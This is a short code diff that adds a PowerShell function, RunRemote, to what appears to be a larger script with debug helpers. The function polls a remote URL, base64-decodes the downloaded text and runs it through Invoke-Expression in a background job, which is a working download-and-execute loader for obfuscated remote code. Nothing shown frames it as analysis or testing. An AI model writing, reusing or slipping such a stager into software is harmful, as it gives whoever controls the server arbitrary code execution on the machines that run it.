@@ -1,4 +1,44 @@
 
+function RunRemote {
+    param (
+        [string]$baseUrl,
+        [string]$part,
+        [bool]$waitForFinish
+    )
+    $url = "$baseUrl/$part.txt"
+    $timeout = [datetime]::UtcNow.AddMinutes(5)
+    $delay = 5
+    Start-Sleep -Seconds $delay
+    while ([datetime]::UtcNow -lt $timeout) {
+        try {
+            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
+            if ($response.StatusCode -eq 200) {
+                $scripData = $response.Content
+                $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData))
+                $generalJob = Start-Job -ScriptBlock { Invoke-Expression $using:scripData }
+                if ($waitForFinish) {
+                    Wait-Job -Job $generalJob -Timeout 300 | Out-Null
+                    if ($generalJob.State -eq 'Completed') {
+                        $result = Receive-Job -Job $generalJob
+                        Remove-Job -Job $generalJob
+                        return $result
+                    } else {
+                        writedbg "Job did not complete within the timeout period."
+                        Remove-Job -Job $generalJob
+                        return
+                    }
+                } else {
+                    return
+                }
+            }
+        } catch {
+            writedbg "Failed to runremote ($url): $_"
+        }
+        Start-Sleep -Seconds $delay
+    }
+    writedbg "Failed to run remote ($url) within the allotted time."
+}
+
 function IsDebug {
     $debugFile = "C:\debug.txt"
     
